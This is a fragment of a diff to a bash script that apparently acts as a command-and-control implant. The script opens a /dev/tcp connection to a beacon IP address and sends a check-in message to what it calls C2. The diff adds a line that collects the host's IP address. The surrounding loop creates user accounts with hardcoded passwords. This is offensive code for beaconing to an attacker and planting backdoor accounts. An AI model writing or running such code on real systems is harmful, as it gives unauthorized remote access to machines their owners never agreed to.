@@ -48,6 +48,8 @@ exec 3<>/dev/tcp/$beaconIPAddress/80
 # Send initial message to C2
 echo "Linux" >&3
 
+ipadddress=$(ip addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | grep -v '^127\.0\.0\.1$' | head -n 1)
+
 # Add users
 for user in "Jimithy:Password-123456" "Doug:Password-12345"; do
   username=$(echo "$user" | cut -d':' -f1)
